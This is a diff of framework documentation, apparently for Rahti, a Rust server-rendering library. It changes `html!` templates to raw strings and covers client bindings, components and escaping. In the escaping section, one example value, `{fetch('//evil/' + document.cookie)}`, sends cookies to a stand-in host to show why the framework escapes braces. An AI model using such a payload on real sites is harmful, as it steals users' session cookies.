@@ -1,34 +1,55 @@
 # Rendering and Components
 
-## `html!` Ownership Split
+## Templates
 
-Rahti has two expression dialects:
+A template is one raw string of HTML: `html! {r##"…"##}`. It is the only
+form `html!` accepts.
+
+```rust
+html! {r##"
+    <section class="card">
+        <h1>@{server_title}</h1>
+        <p>Don't worry — text is written as in any HTML file.</p>
+        <button onclick="setCount(count + 1)" hidden="{done}">Clicked {count} times</button>
+        <script>
+            // Plain JavaScript: 'single quotes', `templates` and "#fff" all work.
+            const [count, setCount] = pp.state(@{initial_count});
+            const done = false;
+        </script>
+    </section>
+"##}
+```
+
+Everything between `r##"` and `"##` is HTML, read as text: Rust never lexes
+it, so prose, JavaScript and CSS arrive exactly as written. Two dialects stand
+out from the HTML:
 
 | Syntax | Owner | Evaluation time |
 | --- | --- | --- |
 | `@{rust_expression}` | Rust/Rahti | server render |
 | `{javascript_expression}` | PulsePoint | browser render |
 
-```rust
-html! {
-    <section>
-        <h1>@{server_title}</h1>
-        <button onclick={setCount(count + 1)}>{count}</button>
-        <script>
-            const [count, setCount] = pp.state(@{initial_count});
-        </script>
-    </section>
-}
-```
+- **Text** is plain HTML text. Indentation and line breaks between tags
+  disappear the way JSX drops them; a space typed on one line stays. `<pre>`
+  and `<textarea>` keep their whitespace. Write a literal `<` as `&lt;`, a
+  literal brace as `&#123;`/`&#125;`, and a literal `@{` as `@@{`.
+- **Attributes** are written as in HTML. A PulsePoint binding is the whole
+  quoted value, `hidden="{!open}"`; an unquoted `name="{…}"` is a compile error
+  naming the quoted form. A handler is quoted JavaScript, `onclick="save()"`.
+  A server value is the whole value, unquoted: `href=@{url}`.
+- **`<script>` and `<style>`** bodies are JavaScript and CSS exactly as
+  written, comments included. `@{expr}` inside a script renders a Rust value as
+  JavaScript (see "Escaping and Trusted Markup").
+- **`<!-- … -->`** is a note in the template and is not sent to the browser.
+- **A template nested in `@{…}`** uses one fewer `#`, so it cannot end its
+  parent: `@{Html::concat(items.iter().map(|i| html! {r#"<li>@{i}</li>"#}))}`.
+  Prefer a component, or build the list in Rust above the template.
 
-Use quoted Rust strings for authored text:
-
-```rust
-<p>"Stable authored text"</p>
-```
-
-Plain HTML-like text is accepted, but Rust tokenization makes punctuation and
-whitespace fragile. Quoted text is the convention.
+Compute values in plain Rust above the template and interpolate names
+(`@{title}`, not `@{user.profile().display_name()}`): a mistake `html!` finds
+is reported at its file, line and column inside the template, but a Rust
+error inside `@{…}` is reported at the line where the template starts, with a
+message naming the expression.
 
 The two dialects also print differently. `@{…}` renders a Rust value through
 `Display`, so `false` renders `false`. `{…}` serializes its result the way
@@ -47,11 +68,12 @@ Attribute forms:
 
 ```rust
 <a href=@{url}>@{label}</a>
-<input value={name} oninput={setName(target.value)} />
+<input value="{name}" oninput="setName(target.value)" />
 ```
 
-Rahti quotes dynamic attributes in emitted HTML. Client expressions remain
-present for PulsePoint.
+A PulsePoint binding is the whole quoted value; a server value is the whole
+value, unquoted. Rahti quotes dynamic attributes in emitted HTML, and client
+expressions remain present for PulsePoint.
 
 An attribute name is written as it appears in markup: letters, digits, `-`,
 and `:` for a namespace prefix — `data-user-id`, `aria-label`, `xlink:href`,
@@ -71,7 +93,7 @@ An `@{…}` value decides whether its attribute appears at all.
 | `true` / `false` anywhere else | `name="true"` / `name="false"` |
 
 ```rust
-<a href=@{maybe_url}>"Profile"</a>       // no href when None
+<a href=@{maybe_url}>Profile</a>         // no href when None
 <input disabled=@{is_locked} />          // no disabled when false
 <span aria-hidden=@{decorative}>…</span> // aria-hidden="false" when false
 ```
@@ -101,9 +123,9 @@ are written exactly as typed.
 ```rust
 let extra = Attrs::new().set("id", "avatar").unset("stroke-width");
 
-html! {
+html! {r##"
     <svg class="size-4" stroke-width="2" @{..extra}>…</svg>
-}
+"##}
 ```
 
 ```html
@@ -125,7 +147,8 @@ is sometimes nothing is `@{..maybe}` rather than a branch around the tag. A
 `HashMap` spreads in sorted order, because markup that changes between two
 runs of the same code cannot be reviewed.
 
-Names are validated and values escaped, the same as everywhere else. A name
+Names are validated and values escaped, the same as everywhere else, braces
+included: a spread value is data and never opens a client expression. A name
 markup cannot carry is dropped and reported through `debug_assert!` —
 development says so, and a release build serves the page without that one
 attribute. `pp-component` is the client runtime's and a spread never writes
@@ -136,47 +159,66 @@ forwards attributes declares one — `attrs: Attrs` — and the caller passes it
 by name; an unknown prop stays a compile error rather than becoming an HTML
 attribute nobody meant to write.
 
+### Client Props: `bindings: Bindings`
+
+A `{…}` written on a component tag is a client expression, so the component
+function receives its source rather than a value. All of a tag's `{…}` props
+arrive in one parameter, `bindings: Bindings`; spreading it puts them on the
+element the component renders, where the runtime evaluates them in the
+caller's scope:
+
+```rust
+use crate::rahti::{Bindings, Html, component, html};
+
+#[component]
+pub fn Button(bindings: Bindings, children: Html) -> Html {
+    html! {r##"<button class="btn" @{..bindings}><slot /></button>"##}
+}
+
+// <Button onclick="{save()}">Save</Button>
+// renders <button class="btn" onclick="save()">Save</button>
+```
+
+Only `html!` builds a `Bindings`, from the source written at the tag, so its
+expressions stay live. Every other spread value is data. A tag that writes a
+`{…}` prop on a component without a `bindings` parameter is a compile error
+naming the field.
+
 `<script>` and `<style>` bodies are raw text. Browser JavaScript/CSS braces
 remain literal. `@{...}` is supported inside `<script>` and renders through
 `RenderJs`; it is not lifted inside `<style>`.
 
-### Scripts as Raw Strings
+### Scripts
 
-A `<script>` body written as tokens still has to survive the **Rust** lexer
-before `html!` sees it. That rules out JavaScript the Rust lexer rejects or
-drops: single-quoted strings (`'hi'`), template literals (`` `${x}` ``), and
-comments, which vanish. When a script needs any of them, write its body as
-one raw string literal:
+A `<script>` body is JavaScript exactly as written — comments, single
+quotes, template literals and regex literals included:
 
 ```rust
-html! {
+html! {r##"
     <section>
         <p>{greeting}</p>
-        <script>r#"
+        <script>
             // Comments stay.
             const name = @{Json(&user.name)};
             const [greeting, setGreeting] = pp.state(`Hello, ${name}!`);
-            const quote = 'single quotes work';
-        "#</script>
+            const color = "#4f46e5";
+        </script>
     </section>
-}
+"##}
 ```
 
-The contents reach the browser exactly as written. `@{expr}` is still lifted
-from them as a Rust expression, rendered through `RenderJs`; write `@@{` for a
-literal `@{`. A body containing `"#` needs more hashes: `r##"…"##`. Only a raw
-string switches to this form — `r"…"` is not JavaScript, so it cannot be a
-script that meant something else — and a plain `"use strict";` body stays an
-ordinary token body.
-
-Prefer the raw-string form for any script longer than a few lines: it is the
-form where what you write is what runs. Keep large modules in `public/js/` and
-load them with `import()`.
+`@{expr}` is lifted from it as a Rust expression, rendered through
+`RenderJs`; write `@@{` for a literal `@{`. Keep large modules in
+`public/js/` and load them with `import()`.
 
 ## Escaping and Trusted Markup
 
 Rust strings and values are escaped in text and attribute position. Attributes
-also escape quotes. `Html` is already trusted and passes through.
+also escape quotes. Braces are escaped too, as `&#123;` and `&#125;`: the
+browser runtime compiles every `{…}` it finds in a reactive block, so a stored
+value such as `{fetch('//evil/' + document.cookie)}` would otherwise run as
+code. The page shows the braces as text. `Html` is already trusted and passes
+through with its braces live.
 
 - `Html::escape(text)` creates safe text markup.
 - `Html::from_raw(raw)` trusts the caller completely; use only with sanitized
@@ -194,6 +236,14 @@ To show literal PulsePoint braces as text, use a brace character reference
 such as `"&#123;user&#125;"`; the macro protects it so the browser runtime
 does not treat it as a binding.
 
+The root layout's `<slot />` sits inside a deferred `<template
+pp-component>`, and the browser decodes one layer of character references as
+it parses that template. `html!` therefore writes a root layout's children one
+encoding layer higher (`&amp;#123;`), skipping `<script>` and `<style>`
+bodies, so a value's `&#123;` still reaches the runtime as a reference.
+Markup outside the slot, such as `<head>`, is parsed once and shows `&#123;`
+as a brace directly.
+
 ## Components
 
 A component is an ordinary PascalCase Rust function:
@@ -203,12 +253,12 @@ use crate::rahti::{Html, component, html};
 
 #[component]
 pub fn Card(title: &str, children: Html) -> Html {
-    html! {
+    html! {r##"
         <section>
             <h2>@{title}</h2>
             <slot />
         </section>
-    }
+    "##}
 }
 ```
 
@@ -218,7 +268,7 @@ parameters:
 
 ```rust
 <Card title="Profile">
-    <p>"Ada"</p>
+    <p>Ada</p>
 </Card>
 ```
 
@@ -277,9 +327,9 @@ whole output:
 ```rust
 #[component]
 pub fn Spotlight(children: Html) -> Html {
-    html! {
+    html! {r##"
         <Card title="Spotlight">@{children}</Card>
-    }
+    "##}
 }
 ```
 
@@ -307,12 +357,12 @@ A block that renders siblings may root itself in `<>…</>`:
 ```rust
 #[component]
 pub fn Pair(label: &str) -> Html {
-    html! {
+    html! {r##"
         <>
             <dt>@{label}</dt>
             <dd><slot /></dd>
         </>
-    }
+    "##}
 }
 ```
 
@@ -355,12 +405,12 @@ Rules and consequences:
 
 Children are not implicit in the function: declare `children: Html`, then
 place `<slot />`. At the call site they are what sits between the tags —
-markup, quoted text, other component tags, `@{…}` values, or several
+markup, text, other component tags, `@{…}` values, or several
 siblings, joined in order:
 
 ```rust
 <Card title="Profile">
-    <p>"Ada"</p>
+    <p>Ada</p>
     <Badge text="Rust" />
 </Card>
 ```
@@ -374,9 +424,9 @@ Children built in Rust are handed in with `@{…}`, or passed positionally
 through the call form. For repeated children:
 
 ```rust
-let rows = Html::concat(items.iter().map(|item| html! {
+let rows = Html::concat(items.iter().map(|item| html! {r##"
     <li>@{item}</li>
-}));
+"##}));
 ```
 
 ```rust
@@ -392,7 +442,7 @@ markup of its own:
 ```rust
 #[component]
 pub fn Section(title: &str, children: Html) -> Html {
-    html! {
+    html! {r##"
         <section>
             <Panel title=@{title}>
                 <h3>{heading}</h3>
@@ -400,7 +450,7 @@ pub fn Section(title: &str, children: Html) -> Html {
             </Panel>
             <script>const heading = "Totals";</script>
         </section>
-    }
+    "##}
 }
 ```
 
@@ -425,12 +475,12 @@ serialization the children take is decided per child block:
   component's boundary. The runtime renders the template in the owner's
   scope and re-renders it whenever the owner's state changes, so
   `<Badge>{count}</Badge>` follows the page's `count`, and so does
-  `<Card><Input value={query} /></Card>`: the inner component writes the
+  `<Card><Input value="{query}" /></Card>`: the inner component writes the
   prop on its root, which is evaluated in the owner's scope. Owned content
   is inert markup until hydration.
 - **Children carrying their own `<script>`** are a self-contained block: a
   single root is stamped `pp-component` — the same block a separate
-  `html! { … }` child argument is — and its bindings resolve against state
+  `html! {r##"…"##}` child argument is — and its bindings resolve against state
   it declares itself, never the caller's.
 - **Static children** are served inline, visible without JavaScript, with a
   single root stamped as before.
